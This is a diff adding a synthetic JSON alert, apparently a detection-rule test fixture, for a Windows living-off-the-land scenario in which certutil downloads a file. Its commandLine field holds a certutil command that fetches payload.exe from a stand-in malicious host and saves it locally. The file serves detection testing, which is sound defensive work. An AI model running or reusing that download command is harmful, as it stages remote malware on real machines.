@@ -1,0 +1,31 @@
+{
+  "timestamp": "2025-08-19T05:17:53.658251Z",
+  "rule": {
+    "id": 18152,
+    "level": 10,
+    "description": "Test log for lol_01_certutil_download",
+    "groups": [
+      "test",
+      "windows"
+    ]
+  },
+  "agent": {
+    "id": "002",
+    "name": "WIN-SERVER01",
+    "ip": "192.168.1.10"
+  },
+  "win": {
+    "system": {
+      "eventID": "1",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer": "WIN-SERVER01"
+    },
+    "eventdata": {
+      "commandLine": "certutil.exe -urlcache -split -f http://phishing.ml/payload.exe C:\\temp\\payload.exe",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "parentImage": "C:\\Windows\\System32\\cmd.exe"
+    }
+  },
+  "location": "EventChannel",
+  "full_log": "Test log entry for lol_01_certutil_download scenario"
+}
